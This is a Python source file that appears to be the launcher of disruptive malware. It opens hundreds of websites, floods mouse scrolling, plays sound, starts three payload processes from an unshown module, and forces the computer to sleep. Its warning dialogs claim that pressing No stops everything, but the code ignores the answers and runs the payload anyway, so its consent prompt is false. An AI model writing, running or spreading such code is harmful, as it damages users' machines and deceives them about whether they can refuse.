import faulthandler; faulthandler.enable()
from tkinter import messagebox
import webbrowser, os, time
from multiprocessing import Process
from threading import Thread


import Launch_Proc as LP
from Config import *


import pyautogui
if __name__ == "__main__":
    
    try: 
        os.remove("exit/exit.txt")
    except:
        print('oops exit file no longer exist')





    messagebox.showwarning(title='WARNING', message="We are not responsible for any damages you made. If you don't want to execute the malware then click ok then no.")
    yes = messagebox.askyesno(title='2nd WARNING', message="The software you just executed is considered malware. This malware will harm your computer and makes it unusable. If you are seeing this message without knowing what you just executed, simply press No and nothing will happen. If you know what this malware does and you are using a safe environment to test, press Yes to start it. DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?")
    print(yes)
    yes = messagebox.askyesno(title='LAST WARNING', message="ARE YOU SURE DO YOU WANT TO EXECUTE THIS MALWARE???")
    print(yes)



    if Open_Websites:
        def opener(web): 
            webbrowser.open(web)
        for i, web in enumerate(website):
            print(F' {i}/502 {web}')
            Thread(target=opener, args=(web,)).start()
    
    if Scroll:
        def scroll():
            print('Scrolling mouse')
            for i in range(100):
                print('scroll')
                pyautogui.scroll(2000)
        Thread(target = scroll, daemon=True).start()
    if Sound:
        def SOUND():
            print('Launching sound')
            S = Process(target=LP.Sound)
            S.start()
        Thread(target = SOUND, daemon=True).start()
    
    for i in range(100000):
        print('')
    print('Launching Payload')
    if Launch:
        p1 = Process(target=LP.FVG)
        p2 = Process(target=LP.MS)
        p3 = Process(target=LP.W)
        p1.start()
        p2.start()
        p3.start()
    else:
        print('Payload launch is disabled. Skipping payload...')
    
    time.sleep(20)
    if Sleep_pc:
        '''
        Sleep computer

        Use ctypes.cdll.LoadLibrary() instead of os.system()
        '''
        """"""
        import ctypes

        dll = ctypes.cdll.LoadLibrary('powrprof.dll')
        dll.SetSuspendState('Sleep')
        """"""
        
    f = open("exit/exit.txt", "w")
    f.write("Exit")
    os.path.isfile("exit/exit.txt")
    f.close()
    exit()